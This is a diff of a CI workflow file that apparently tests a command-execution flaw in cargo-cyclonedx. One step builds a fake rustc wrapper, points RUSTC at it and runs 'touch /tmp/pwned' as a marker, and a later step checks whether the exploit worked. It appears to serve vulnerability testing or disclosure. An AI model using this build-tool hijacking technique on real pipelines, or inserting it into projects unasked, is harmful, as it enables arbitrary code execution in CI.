@@ -1,4 +1,4 @@
-      - name: Generate SBOM 
+      - name: Generate SBOM (Test Exploit)
         run: |
           echo '#!/bin/bash' > fake_rustc
           echo 'if [[ "$*" == *"--print=file-names"* ]]; then' >> fake_rustc
@@ -14,8 +14,8 @@
           echo 'fi' >> fake_rustc
           echo 'touch /tmp/pwned' >> fake_rustc  # Arbitrary command execution
           chmod +x fake_rustc
-          
-          RUSTC=./fake_rustc cargo cyclonedx --verbose || true  # Prevents CI failure
+          export RUSTC=./fake_rustc
+          cargo cyclonedx --verbose || true  # Prevent CI failure
 
       - name: Check if Exploit Worked
         run: |
